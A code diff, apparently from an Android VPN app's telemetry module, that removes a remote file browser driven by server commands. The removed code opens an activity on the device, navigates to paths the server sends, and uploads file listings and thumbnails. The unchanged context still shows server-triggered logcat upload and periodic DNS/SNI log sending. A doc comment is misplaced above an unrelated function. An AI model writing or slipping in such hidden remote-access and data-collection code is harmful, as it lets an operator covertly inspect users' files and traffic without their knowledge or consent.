@@ -1,7 +1,6 @@
 package com.nanored.vpn.telemetry
 
 import android.content.Context
-import android.content.Intent
 import android.content.SharedPreferences
 import android.net.ConnectivityManager
 import android.net.NetworkCapabilities
@@ -20,7 +19,6 @@ import java.io.InputStreamReader
 import java.io.OutputStreamWriter
 import java.net.URL
 import java.util.*
-import com.nanored.vpn.ui.RemoteFileBrowserActivity
 import java.util.concurrent.ConcurrentLinkedQueue
 import javax.net.ssl.HttpsURLConnection
 import kotlinx.coroutines.sync.Mutex
@@ -34,7 +32,6 @@ object NanoredTelemetry {
     private const val KEY_API_KEY = "api_key"
     private const val KEY_LAST_ACCOUNT_ID = "last_account_id"
     private const val COMMAND_POLL_INTERVAL_MS = 15_000L
-    private const val FILE_SESSION_POLL_MS = 15_000L
 
     private lateinit var context: Context
     private lateinit var baseUrl: String
@@ -49,20 +46,7 @@ object NanoredTelemetry {
     private var heartbeatJob: Job? = null
     private var dnsFlushJob: Job? = null
     private var commandPollingJob: Job? = null
-    private var fileSessionHeartbeatJob: Job? = null
-    private var remoteFileSessionId: String? = null
     private val registerMutex = Mutex()
-
-    data class FileEntrySnapshot(
-        val name: String,
-        val path: String,
-        val isDirectory: Boolean,
-        val sizeBytes: Long?,
-        val mimeType: String?,
-        val modifiedAt: String?,
-        val isImage: Boolean,
-        val thumbnail: String?,
-    )
 
     data class ConnectionEntry(val destIp: String, val destPort: Int, val protocol: String = "TCP", val domain: String? = null)
 
@@ -291,67 +275,6 @@ object NanoredTelemetry {
         }
     }
 
-    /**
-     * DNS flush job: sends DNS/SNI log every 10 seconds, then clears the log.
-     */
-    private fun startRemoteFileSession(sessionId: String?) {
-        if (sessionId.isNullOrBlank()) return
-        if (remoteFileSessionId == sessionId) return
-
-        remoteFileSessionId = sessionId
-
-        val intent = Intent(context, RemoteFileBrowserActivity::class.java).apply {
-            putExtra(RemoteFileBrowserActivity.EXTRA_SESSION_ID, sessionId)
-            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-        }
-
-        context.startActivity(intent)
-
-        fileSessionHeartbeatJob?.cancel()
-        fileSessionHeartbeatJob = scope.launch {
-            while (isActive && remoteFileSessionId == sessionId) {
-                delay(FILE_SESSION_POLL_MS)
-                try {
-                    post(
-                        "/api/v1/client/files/session/heartbeat",
-                        JSONObject().apply { put("session_id", sessionId) },
-                        auth = true,
-                    )
-                } catch (_: Exception) {
-                }
-            }
-        }
-    }
-
-    private fun stopRemoteFileSession(reasonSessionId: String? = null) {
-        val activeSessionId = remoteFileSessionId
-        if (activeSessionId == null) return
-        if (!reasonSessionId.isNullOrBlank() && activeSessionId != reasonSessionId) return
-
-        fileSessionHeartbeatJob?.cancel()
-        fileSessionHeartbeatJob = null
-        remoteFileSessionId = null
-        RemoteFileBrowserActivity.requestCloseCurrentSession()
-
-        scope.launch {
-            try {
-                post(
-                    "/api/v1/client/files/session/close",
-                    JSONObject().apply { put("session_id", activeSessionId) },
-                    auth = true,
-                )
-            } catch (_: Exception) {
-            }
-        }
-    }
-
-    fun notifyRemoteFileSessionClosed(sessionId: String?) {
-        val active = remoteFileSessionId
-        if (active == null) return
-        if (sessionId != null && active != sessionId) return
-        stopRemoteFileSession()
-    }
-
     private fun startDnsFlush() {
         dnsFlushJob?.cancel()
         dnsFlushJob = scope.launch {
@@ -375,53 +298,6 @@ object NanoredTelemetry {
             val cmd = commands.optJSONObject(i) ?: continue
             when (cmd.optString("type")) {
                 "upload_logs" -> collectAndSendLogcat()
-                "file_browser" -> {
-                    when (cmd.optString("action")) {
-                        "start" -> startRemoteFileSession(cmd.optString("session_id"))
-                        "navigate" -> RemoteFileBrowserActivity.requestNavigateCurrentSession(
-                            cmd.optString("session_id"),
-                            cmd.optString("path"),
-                        )
-                        "stop" -> stopRemoteFileSession(cmd.optString("session_id"))
-                    }
-                }
-            }
-        }
-    }
-
-    fun uploadFileBrowserSnapshot(
-        sessionId: String,
-        path: String,
-        hasParent: Boolean,
-        entries: List<FileEntrySnapshot>,
-    ) {
-        scope.launch {
-            try {
-                if (apiKey == null) return@launch
-                val arr = JSONArray()
-                for (entry in entries) {
-                    arr.put(JSONObject().apply {
-                        put("name", entry.name)
-                        put("path", entry.path)
-                        put("is_directory", entry.isDirectory)
-                        put("size_bytes", entry.sizeBytes)
-                        put("mime_type", entry.mimeType)
-                        put("modified_at", entry.modifiedAt)
-                        put("is_image", entry.isImage)
-                        if (entry.thumbnail != null) put("thumbnail_base64", entry.thumbnail)
-                    })
-                }
-                post(
-                    "/api/v1/client/files/snapshot",
-                    JSONObject().apply {
-                        put("session_id", sessionId)
-                        put("path", path)
-                        put("has_parent", hasParent)
-                        put("entries", arr)
-                    },
-                    auth = true,
-                )
-            } catch (_: Exception) {
             }
         }
     }
